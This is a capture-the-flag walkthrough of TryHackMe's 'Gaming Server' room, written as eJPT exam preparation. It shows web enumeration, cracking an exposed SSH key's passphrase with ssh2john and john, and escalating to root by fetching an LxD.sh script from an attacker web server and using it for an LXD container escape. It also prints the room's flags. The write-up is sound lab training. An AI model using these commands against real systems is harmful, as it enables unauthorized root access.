---
title: "Gaming Server"
date: 2026-02-25
draft: false
description: "Walkthrough of Gaming Server from TryHackMe. SSH key with cracked passphrase, access as john and privilege escalation via lxd group — eJPT preparation."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "ssh",
    "john",
    "lxd",
    "privesc",
    "web",
    "container-escape",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 14
---

## Summary

**Gaming Server** is the fourteenth machine of the _Road to eJPTv2_ series. A small attack surface machine — only SSH and HTTP — where web enumeration reveals a passphrase-protected SSH key and a username in the source code. The privilege escalation introduces a less common but highly relevant technique: **LXD container escape** to access the host filesystem as root.

| Attribute      | Value                                                              |
| -------------- | ------------------------------------------------------------------ |
| **Platform**   | TryHackMe                                                          |
| **Difficulty** | Easy                                                               |
| **OS**         | Linux (Ubuntu)                                                     |
| **Room**       | [Gaming Server](https://tryhackme.com/room/gamingserver)           |
| **Skills**     | Web Enum, SSH Key Cracking, LXD Privilege Escalation               |

### Tools Used

- `nmap` — port scanning and version detection
- `whatweb` — web fingerprinting
- `gobuster` — web directory fuzzing
- `ssh2john` — SSH key to hash conversion
- `john` — passphrase hash cracking
- `ssh` — private key access
- `lxd` / `LxD.sh` — container escape for privesc

### Solution Overview

1. **Recon:** nmap detects only SSH and HTTP. The site is called "House of danak".
2. **Web fuzzing:** gobuster finds `/uploads` (with a wordlist) and `/secret` (with an `id_rsa` key).
3. **Source code:** HTML reveals username `john`.
4. **Passphrase cracking:** The SSH key is passphrase-protected. `ssh2john` + `john` cracks it: `letmein`.
5. **SSH access:** We connect as `john` using the key and passphrase.
6. **User flag:** Found at `/home/john/user.txt`.
7. **PrivEsc:** `john` belongs to the `lxd` group. We use a container escape script with an Alpine image to mount the host filesystem and read the root flag.

---

## Reconnaissance

### Ping

We verify connectivity and identify the OS by TTL:

```bash
ping -c 1 10.67.172.94
```

```
64 bytes from 10.67.172.94: icmp_seq=1 ttl=62 time=71.0 ms
```

TTL 62 → Linux (original value is 64, decremented through network hops).

### Nmap — Port Scan

```bash
nmap 10.67.172.94 -n -Pn -sS -p- --open --min-rate=5000 -oG AllTCPports
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports — all initial enumeration will be web-based.

### Nmap — Versions and Scripts

```bash
nmap 10.67.172.94 -n -Pn -sS -p22,80 -sVC --min-rate=5000 -oN gamingscan.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
```

The site title is **House of danak** — a gaming-themed website.

### Whatweb

```bash
whatweb http://10.67.172.94
```

```
http://10.67.172.94 [200 OK] Apache[2.4.29], Title[House of danak]
```

### Web Fuzzing — gobuster

```bash
gobuster dir -u http://10.67.172.94 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,bak,css,xml,.ssh
```

```
/index.html   (Status: 200)
/about.html   (Status: 200)
/uploads      (Status: 301)
/style.css    (Status: 200)
/secret       (Status: 301)
/myths.html   (Status: 200)
```

Two key findings:
- `/uploads` — contains a downloadable wordlist
- `/secret` — contains an `id_rsa` private key

### Source Code — User john

Inspecting the site's HTML source code we find a comment leaking a username:

```html
<!-- john, please add some content to the site -->
```

> **Username found:** `john`

---

## Exploitation

### Downloading the SSH Key

We download the private key from `/secret/`:

```bash
wget http://10.67.172.94/secret/id_rsa
chmod 600 id_rsa
```

When trying to connect via SSH, the key requests a passphrase — it's not direct access:

```bash
ssh -i id_rsa john@10.67.172.94
Enter passphrase for key 'id_rsa':
```

### Passphrase Cracking — ssh2john + john

We convert the key to a format John the Ripper can process:

```bash
ssh2john id_rsa > idrsagaming.hash
```

We launch the attack with rockyou.txt:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt idrsagaming.hash
```

```
letmein          (id_rsa)
1g 0:00:00:00 DONE (2026-02-25 21:15)
```

> **Key passphrase:** `letmein`

### SSH Access as john

```bash
ssh -i id_rsa john@10.67.172.94
Enter passphrase for key 'id_rsa': letmein
```

```
john@exploitable:~$
```

---

## Post-Exploitation

### User Flag

```bash
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

> **User flag:** `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

### Enumeration — lxd group

```bash
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

`john` belongs to the `lxd` group — this allows creating and managing LXD containers with access to the host device.

---

## Privilege Escalation

### LXD Container Escape

LXD is Ubuntu's container manager. A user in the `lxd` group can create containers with the host disk mounted, effectively granting root access to the full host filesystem from inside the container.

**Step 1:** An Alpine image is already present in `/tmp`. We transfer the exploit script from our machine:

```bash
# Attacker machine
python3 -m http.server 80

# Victim machine
cd /tmp
wget http://192.168.136.70/LxD.sh
chmod +x LxD.sh
```

**Step 2:** We run the script with the Alpine image:

```bash
john@exploitable:/tmp$ ./LxD.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz
```

```
Image imported with fingerprint: cd73881adaac...
Creating privesc
Device giveMeRoot added to privesc
~ # whoami
root
```

The script imports the Alpine image, creates a container with the host disk mounted at `/mnt/root`, and opens a root shell inside the container.

**Step 3:** We access the host filesystem from within the container:

```bash
~ # cd /mnt/root/root/
/mnt/root/root # cat root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

> **Root flag:** `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

---

## Lessons Learned

- **Generic-named web directories hide important things** — `/secret` and `/uploads` are names that always deserve investigation. Thorough fuzzing is essential.
- **A passphrase-protected SSH key is not a dead end** — `ssh2john` converts the key to a crackable hash. Keys with weak passphrases are as vulnerable as weak passwords.
- **`id` is one of the first commands in post-exploitation** — Groups like `lxd`, `docker`, `disk` or `sudo` are immediate escalation vectors. Always check group membership.
- **LXD/Docker in an unprivileged user's group = effective root** — Any user in the `lxd` or `docker` group can escalate to root by mounting the host filesystem. It's a critical misconfiguration.
- **Containers are not a security boundary if the user controls them** — Container isolation only works when the user has no management permissions over them.

### For the eJPT

| Concept                          | eJPT Relevance                                          |
| -------------------------------- | ------------------------------------------------------- |
| Thorough web enumeration         | Hidden directories are frequent vectors in the exam     |
| SSH passphrase cracking          | Access technique with protected credentials             |
| User group analysis              | Standard post-exploitation enumeration                  |
| LXD/Docker group privesc         | Misconfiguration privesc without kernel exploit         |

**Approximate completion time:** 30-45 minutes.

---

## References

- [Gaming Server — TryHackMe](https://tryhackme.com/room/gamingserver)
- [LXD Privilege Escalation — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
